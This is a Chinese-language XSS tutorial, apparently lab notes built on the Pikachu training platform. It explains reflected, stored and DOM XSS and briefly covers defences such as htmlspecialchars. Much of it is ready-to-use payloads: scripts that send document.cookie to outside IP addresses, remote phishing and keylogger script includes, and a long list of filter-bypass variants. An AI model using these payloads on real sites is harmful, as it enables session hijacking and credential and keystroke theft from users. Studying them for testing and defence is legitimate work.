## XSS漏洞基础

https://websec.readthedocs.io/zh/latest/vuln/xss/index.html

------

### 什么是XSS

XSS全称（Cross Site Scripting）跨站脚本攻击，是最常见的Web应用程序安全漏洞之一，仅次于SQL注入。XSS是指攻击者在网页中嵌入客户端脚本，通常是JavaScript编写的危险代码，当用户使用浏览器浏览网页时，脚本就会在用户的浏览器上执行，从而达到攻击者的目的。由此可知，XSS属于客户端攻击，受害者最终是用户，但特别要注意的是网站管理人员也属于用户之一。这就意味着XSS可以进行“服务端”攻击，因为管理员要比普通用户的权限大得多，一般管理员都可以对网站进行文件管理，数据管理等操作，而攻击者一般也是靠管理员身份作为“跳板”进行实施攻击。

------

### XSS漏洞出现的原因

程序对输入输出的控制不够严格，导致“精心构造”的脚本输入后，在输出到前端时被浏览器当作有效代码解析执行从而产生危害。

![img](https://img-blog.csdnimg.cn/img_convert/ce0226cf5848186fe7bb2440157ac740.png)

------

### XSS的危害

a.劫持用户cookie是最常见的跨站攻击形式，通过在网页中写入并执行脚本执行文件（多数情况下是JavaScript脚本代码），劫持用户浏览器，将用户当前使用的sessionID信息发送至攻击者控制的网站或服务器中。

b.框架钓鱼：利用XSS漏洞，我们可以在网页中插入恶意js代码，通过js代码，我们可以干很多事情，例如伪造一个登陆页面。当用户访问该网页时，就会自动弹出登陆页面，如果用户信以为真，输入了用户名与密码，信息就会传输到攻击者的服务器中，完成账号窃取。

c.网站挂马
d.键盘记录

------

### XSS分类

**a.反射型(非持久性)**
只对本次访问有影响，传参中有攻击代码，交互的数据一般不会被存在数据库中，一次性，所见即所得，一般出现在查询类页面等。

攻击者构造恶意的 URL，其中包含恶意脚本。当用户点击带有恶意参数的 URL 时，服务器将恶意脚本作为响应的一部分返回给用户浏览器，并在浏览器中执行。

**payload**：

```html
'"><script>confirm(1)</script>
```

![img](https://img-blog.csdnimg.cn/img_convert/070dea4c37d08353277c3b291893c9fb.jpeg)

------

**b.存储型（持久性）**
存储到网站（数据库，日志或者其他东西），永久性存储，不带攻击传参，访问链接，如果生效就是存储型XSS。

存储型 XSS 发生在网站存储用户提交的数据，且未经过滤或转义的情况下直接在网页中显示。攻击者提交包含恶意脚本的数据，然后其他用户在访问包含该数据的页面时，恶意脚本将在他们的浏览器中执行。

![img](https://img-blog.csdnimg.cn/img_convert/fb2f35c49a9724aec14de089ffc95142.jpeg)

------

**c.Dom型（不一定）**
DOM 型的 XSS 注入与反射型原理类似，只不过 DOM 型的 XSS 注入不需要经过后端代码处理，不与后台服务器产生数据交互，而是在前端。
JavaScript 调用 DOM 元素时可能产生的漏洞，可能触发 DOM 型 XSS 的 JavaScript 代码，大部分属于反射型XSS。

闭合标签：

```
' onclick="(111)"
' onclick="('xss')">
'><img src="#" onmouseover="alert('xss')">
```

------

*<1.什么是Dom*
DOM，全称Document Object Model，是一个平台和语言都中立的接口，可以使程序和脚本能够动态访问和更新文档的内容、结构以及样式。

------

*<2.Dom型Xss简介*
DOM型XSS其实是一种特殊类型的XSS，它是基于DOM文档对象模型的一种漏洞。
在网站页面中有许多页面的元素，当页面到达浏览器时浏览器会为页面创建一个顶级的Document object文档对象，接着生成各个子文档对象，每个页面元素对应一个文档对象，每个文档对象包含属性、方法和事件。可以通过JS脚本对文档对象进行编辑从而修改页面的元素。也就是说，客户端的脚本程序可以通过DOM来动态修改页面内容，从客户端获取DOM中的数据并在本地执行。基于这个特性，就可以利用JS脚本来实现XSS漏洞的利用。

------

*< 3.Dom型XSS的危害*

> DOM-XSS不经过服务端，只看服务端的日志和数据库，很难排查到
> DOM-XSS一般是通杀浏览器的
> DOM-XSS一般是被攻击的时候就执行了XSS，由于是前端DOM操作导致，很难留下痕迹

------

*<4.Document对象属性*
Document的存在可以让浏览器获取网页信息，然后用JS来填充来节约服务器性能。
因为前端代码都在客户浏览器上面执行和服务器无关，另外，XSS攻击的目标是目标浏览器，不是攻击目标服务器。

**常见的Document对象属性**

> cookie //设置或读取当前文档有关的所有cookie
> domain //返回当前文档的域名
> lastModified //返回文档被最后修改的日期和时间
> referrer //返回载入当前文档的来源文档的URL
> title //返回当前文档的标题
> URL //返回当前文档的URL
> write() //向文档写HTML表达式或JS代码

document.cookie （XSS必备函数）
document.lastModified （识别伪静态必备）
document.write() （Dom型XSS常见存在方式）

------

<5.Dom型XSS的三种常见状态

a.document.write()（网页跳转）

> var pos=document.URL.indexOf(“name=”)+5; //取name=后面的值
> var username = unescape(document.URL.substring(pos,document.URL.length)); //取name=后面的值
> var r=‘**’+username+‘**’
> document.write®;
> ![在这里插入图片描述](https://img-blog.csdnimg.cn/direct/67f06de3179c4cf48621e0d6ec3360a3.png)

这里利用indexof获取url里的传参，然后用document.write()输出到HTML中,完成xss。
这种方式是非常隐蔽的，因为我们的传参没有和后端交互。这里使用？发送的数据包中可以看到咱们的传参![在这里插入图片描述](https://img-blog.csdnimg.cn/538920a4b59143d5ab8052883bc3e89c.png)
但是我们这里使用锚点#，后端是不会识别锚点的，锚点只是给浏览器用的。![在这里插入图片描述](https://img-blog.csdnimg.cn/85cf5240d1fe49d7afdd9cbe90a260d4.png)
这种数据包里都没有咱们的传参值的，非常的隐蔽！还有是document.write()它可以接受native编码，有时可以利用这个特性来绕waf！

b.innerHTML

```html
<div id='666'>hello</div>
<input type="button" onclick=fun() value="点击有惊喜">
<script>
	function fun(){
	var url=unescape(document.URL);//unescape函数是JavaScript中的一个全局函数，用于将被转义的字符串还原成原始字符串。它是escape函数的逆操作。
	var pos=url.indexOf("name=")+5;
	document.getElementById("666").innerHTML="Hi,<b>"+url.substring(pos,url.length)+'</b>';
</script>
```

innerHTML是改变标签中的值，像上面的代码是innerHTML将div标签中的hello改成Hi+name的值![在这里插入图片描述](https://img-blog.csdnimg.cn/a66128ed151e4e7bb33493d9df5144d7.png)
使用谷歌浏览器传入没有发生弹窗，但是使用事件型的XSS语句可以触发弹窗，这是因为像谷歌（不仅限于谷歌)浏览器会对典型的、太明显的XSS语句进行拦截。

c.eval()

```html
</h1>Hello World</h1>
<script>
	var a =location.hash.substr(1);//location.hash是取锚点
	eval(a);   // eval是高危函数。 把字符串当做代码进行执行
</script>
```

![在这里插入图片描述](https://img-blog.csdnimg.cn/direct/af040794c54f44efbeee9d810703c10b.png)
让location.hash获取网页锚点后的值放入eval中当作代码执行。

## XSS漏洞挖掘方法

### XSS可能存在的地方

只要是用户输入输出、交互的地方，都可能存在XSS漏洞。

HTML content

Attribute content

URL content 

```
<a>a标签</a>
```

Style content

Script content

登录、注册、评论、留言等

### XSS测试方法

1、工具扫描：APPscan、AWVS、xray等大型漏扫工具、xsstrike等自动化小工具。

https://github.com/s0md3v/XSStrike

2、手工测试：Burpsuite、Firefox（hackbar）

------

## XSS攻击框架

```javascript
在Console可输入以下代码
document.location.href;/*获取当前网页地址，document可省略。='url'可跳转*/
location.href = 'url';//跳转到url页面 eg：location.href="https://www.baidu.com"
document.location = 'url';//跳转到url页面
document.cookie;//获取当前网页的所有cookie

alert               alert()方法用于显示带有一条指定消息和一个确认按钮的警告框
window.location    window.location对象用于获得当前页面的地址(URL) ,并把浏览器重定向到新的页面 
onload                  一张页面或一幅图像完成加载 
onsubmit              确认按钮被点击 
onerror                 在加载文档或图像时发生错误

<script>alert('XSS')</script>
<script>alert(1)</script>  url编码 %3Cscript%3Ealert%281%29%3C%2Fscript%3E
<script>alert(/xss/)</script>  弹框内容为/XSS/
'"><script>alert('XSS')</script>
<script>alert(document.cookie)</script>//弹框cookie信息
<svg onload=alert(document.domain)>//弹框域名
<img src=1 onerror=alert(/hi/)>
<M onmouseover=alert(document.domain)>M
<marquee onscroll=alert(document.domain)>//失效
<a href=javascript:alert(document.domain)>M</a>
<body onload=alert(document.domain)>
<details open ontoggle=alert(document.domain)>//点击详细信息
<embed src=javascript:alert(document.domain)>
```

### XSS平台搭建及后台使用（cookie获取）

```javascript
'"><script>document.location = 'http://127.0.0.1/pikachu/pkxss/xcookie/cookie.php?cookie=' + document.cookie;</script>
<script>document.location = 'http://121.199.162.86:8889/pkxss/xcookie/cookie.php?cookie=' + document.cookie;</script>
//通过document.location实例进行重定向到http://192.168.1.1/pikachu/pkxss/xcookie/cookie.php?cookie=
```

打开pikachu->管理工具->XSS后台，登录后点击“cookie搜集”。

### 反射型XSS（POST）获取cookie

```javascript
Window.onload;//当浏览器加载完页面所有内容后自动触发执行

POST攻击利用页面：~\phpstudy_pro\phpstudy_pro\WWW\pikachu\pkxss\xcookie\post.html
```

将post.html中的ip地址和xss路径进行修改，引导别人打开这个HTML文件，打开后就自动发送cookie信息到xss后台。

#### **使用cookie登录**

打开正常登录后的网址http://pikachu/vul/xss/xsspost/xss_reflected_post.php，使用Burpsuite拦截，将cookie改为xss后台收集到的cookie，放行后即可登录成功。

### XSS钓鱼演示

方法有很多，但主要看页面搭建的好不好，是不是和正常网站页面一样，能不能骗到别人。只要有XSS漏洞的地方，都可以钓鱼。

以pikachu的存储型xss为例：

```
钓鱼攻击利用页面：~\phpstudy_pro\phpstudy_pro\WWW\pikachu\pkxss\xfish\fish.php

<script src="http://pikachu/pkxss/xfish/fish.php"></script>
<script src="http://121.199.162.86:8889/pkxss/xfish/fish.php"></script>
<script src="http://118.89.145.124/pkxss/xfish/fish.php"></script>
```

打开fish.php，修改ip地址为xss后台。

fish.php代码内容为弹出一个对话框，将用户在对话框中输入的用户名和密码发送到攻击者的xfish.php文件中，保存到攻击者数据库中。

> 钓鱼页面在输入账号密码后经常会提示登录超时等，需要重新登录，网站也会发生变化。

> phpstudy钓鱼演示，认证失败。
>
> **PHP的HTTP认证机制仅在PHP以Apache模块方式运行时才有效，因此该功能不适用于CGI版本。**
>
> **解决方案：重新部署环境**
>
> https://mp.weixin.qq.com/s/NR6tAA8vKexBZ6KXLQXxhA

### XSS获取键盘记录演示

```javascript
'"><script src="http://127.0.0.1/pikachu/pkxss/rkeypress/rk.js"></script>
<script src="http://121.199.162.86:8889/pkxss/rkeypress/rk.js"></script>
<script src="http://118.89.145.124/pkxss/rkeypress/rk.js"></script>
```

输入到存储型XSS页面中。

在该页面敲击键盘，XSS后台页面能够看到键盘记录。

### XSS盲打

盲打只是一种惯称的说法，就是不知道后台不知道有没有xss存在的情况下，不顾一切的输入xss代码在留言、feedback之类的地方，尽可能多的尝试xss的语句与语句的存在方式，就叫盲打。

“xss盲打”是指在攻击者对数据提交后展现的后台未知的情况下，网站采用了攻击者插入了带真实攻击功能的xss攻击代码（通常是使用script标签引入远程的js）的数据。当未知后台在展现时没有对这些提交的数据进行过滤，那么后台管理人员在操作时就会触发xss来实现攻击者预定好的“真实攻击功能”。

 通俗讲就是见到输入框就输入提前准备的xss代码， 通常是使用script标签引入远程的js代码，当有后台人员审核提交数据时候，点击了提交的数据，触发获取到有价值信息 。

```javascript
hi'"><sCrIpT>alert('XSS')</sCrIpT>
hi'"><sCrIpT>alert(666)</sCrIpT>
```

管理员登录时查看相关页面，触发JS代码。

## XSS防御手段 

对输入进行过滤，特殊符号必须过滤掉，单引号、双引号、尖括号等，对输出进行编码。

### htmlspecialchars

```php+HTML
htmlspecialchars(string $string, int $quote_style = ENT_COMPAT, string $encoding = 'UTF-8', bool $double_encode = true)
```

- `$string`：需要转换的字符串。
- `$quote_style`：指定引号的风格。通常有三个可选值：`ENT_COMPAT`、`ENT_QUOTES` 和 `ENT_NOQUOTES`。`ENT_COMPAT` 会输出成 `<`、`>`、`"`、`'`、`&`，`ENT_QUOTES` 会在 `ENT_COMPAT` 的基础上将单引号也转换为实体字符（`'`），`ENT_NOQUOTES` 则不会输出引号。
- `$encoding`：设置字符编码，默认是 `UTF-8`。
- `$double_encode`：布尔值，指示是否对已经存在的实体进行再次编码。
  使用 `htmlspecialchars` 函数可以避免跨站脚本攻击（XSS），因为它可以确保用户输入的字符串被正确地处理，不会因为浏览器解释特殊字符而执行不必要的脚本。

### 输入检查

以下为需要过滤的常见字符：

```
|  &  ;  $  %  @  '  "  \'  \"  <>  ()  +  CR  LF  ,  \
```



## XSS跨站常见绕过方式

XSS攻击绕过过滤方法大全：https://blog.csdn.net/qq_50854790/article/details/124297046

1、对前端的限制可以尝试进行抓包重发或者修改前端的HTML。比如输入框限制20个字符，但是前端的限制对能力强的攻击者来讲是无用的。可以抓包改请求包，或者直接在前端代码中修改等。

2、后端

**大小写混合**

```
<ScRipT>ALert('XSS')</ScRiPt>
<script>ALert(1)</script>
<sCrIpT>ALert(1)</sCrIpT>
<ScRiPt>ALert(1)</ScRiPt>
<sCrIpT>ALert(1)</ScRiPt>
<ScRiPt>ALert(1)</sCrIpT>

<img src=1 onerror=alert(1)>
<iMg src=1 oNeRrOr=alert(1)>
<ImG src=1 OnErRoR=alert(1)>
<img src=1 onerror="alert(&quot;M&quot;)">

<marquee onscroll=alert(1)>//失效
<mArQuEe OnScRoLl=alert(1)>
<MaRqUeE oNsCrOlL=alert(1)>

```

**双写**

```
'"><scr<script>ipt>alert(123);</scr</script>ipt>
<sc<script>ript>alert('hello')</script>
```

**其它标签绕过**

img等

```html
<img src=## onerror=alert(document.cookie)>
<img src="#" onerror=alert('hello')>
<img src=123 onerror=alert('hello')>
<img src="#" οnerrοr=alert('hello')>//字母“o”是希腊字母，无效
'"><img src="#" onerror="alert('hello')">
```

a

```
<a onmouseover=alert(document.cookie)>请点击</a>
" ><a href=javascript:alert(123)>请点击</a>
```

input

```
onfocus=javascript:alert(123)
```

iframe

```
<iframe src=javascript:alert(1)></iframe>
<iframe src="data:text/html,<iframe src=javascript:alert('M')></iframe>"></iframe>
<iframe src=data:text/html;base64,PGlmcmFtZSBzcmM9amF2YXNjcmlwdDphbGVydCgiTWFubml4Iik+PC9pZnJhbWU+></iframe>
<iframe srcdoc=<svg/o&#x6E;load&equals;alert&lpar;1)&gt;></iframe>
<iframe src=https://baidu.com width=1366 height=768></iframe>
<iframe src=javascript:alert(1) width=1366 height=768></iframe
```

form

```
<form action=javascript:alert(1)><input type=submit>
<form><button formaction=javascript:alert(1)>M
<form><input formaction=javascript:alert(1) type=submit value=M>
<form><input formaction=javascript:alert(1) type=image value=M>
<form><input formaction=javascript:alert(1) type=image src=1>
```

**空格绕过**

```html
示例：
<img src="javascript:alert('xss');">
替换：
<img src="java script:alert('xss');">
```

**回车绕过** (换行)

```html
示例：
<img src="javascript:alert('xss');">
替换：
<img src="java
script:
alert('xss');">
```

**Tab绕过**

```html
示例：
<img src="javascript:alert('xss');">
替换：
<img src="javasc	ript:alert('xss');">
```

**注释绕过**

```javascript
示例：
<script>alert()</script>
替换：
<scri<!--1-->pt>alert()</sc<!--1-->ript>
```

**字符拼接**

```html
利用eval：eval是Javascript内置函数，用于计算字符串表达式的值。
示例：
<img src="x" onerror="a=`aler`;b=`t`;c='(`xss`);';eval(a+b+c)">
利用top
示例：
<script>top["al"+"ert"](`xss`);</script>
```

**编码绕过**

```bash
& ——> &amp;
" ——> &quot;
' ——> &#039;
< ——> &#lt;
> ——> &#gt;

Unicode编码
r --> &#x0072 &#0114

url编码
<img src="javascript:%61%6C%65%72%74%28%22%78%73%73%22%29%3B;">

ASCII码
<img src="javascript:97,108,101,114,116,40,34,120,115,115,34,41,59">

base64编码
<img src="javascript:YWxlcnQoJ3hzcycpOw==">
```

**过滤双引号、单引号**

```html
如果是html标签中，我们可以不用引号。如果是在js中，我们可以用反引号代替单双引号
示例：
<img src="x" onerror=alert('xss');>
替换：
<img src="x" onerror=alert(`xss`);>
```

**htmlspecialchars绕过**

```javascript
没有对'进行实体编码，可以使用单引号构造payload
#' onclick='alert(/xss/)'
#' onmousemove='alert(/xss/)'

javascript:alert(123)
```





## XSS跨站-网络钓鱼



## 同源和跨域

跨域

```
http:// www . baidu.com : 80 /index.php
协议    子域名    主域名    端口  资源地址
当协议、主机（主域名、子域名）、端口中的任意一个不相同时，称为不同域。不同域之间请求数据的操作，称为跨域操作。
```

同源

```
对于js代码来说，为了安全考虑，所有浏览器都约定了“同源策略”，同源策略禁止页面加载或执行与自身来源不同的域的任何脚本，即不同域之间不能使用js进行操作。比如：x.com的js不能操作y.com域名下的对象。
为什么要有同源策略呢？比如一个恶意网站页面通过js嵌入了银行的登录页面（二者不同源），也就是说恶意的请求了其他网站的页面或数据，拿到自己页面上用，如果没有同源限制，恶意网页的js脚本就可以在用户登录银行的时候获取用户名和密码。

不受同源策略影响：（资源类型有限）
<script src="...">//js加载执行
<img src="...">//图片
<link href="...">//css
<iframe src="...">//任意资源
<a href="...">//超链接地址

修改：
phpstudy\www\pikachu\pkxss\rkeypress\rkserver.php
Access-Control-Allow-Origin:*,允许所有人访问。一般不会设置*。
```

### cors跨域

```
//设置允许被跨域访问
header("Access-Control-Allow-Origin:*");
```

### jsonp跨域

是一种利用 `<script>` 标签进行跨域数据请求的技术。它允许你在网页中请求来自其他域的数据，而无需担心浏览器的同源策略（Same-Origin Policy）带来的限制。

